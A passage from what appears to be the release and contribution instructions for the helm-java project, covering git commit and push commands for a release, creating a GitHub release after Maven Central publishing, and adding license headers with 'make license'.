   git add .
   git commit -m ""[RELEASE] v0.0.11 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```
",12,10,1,Apache-2.0
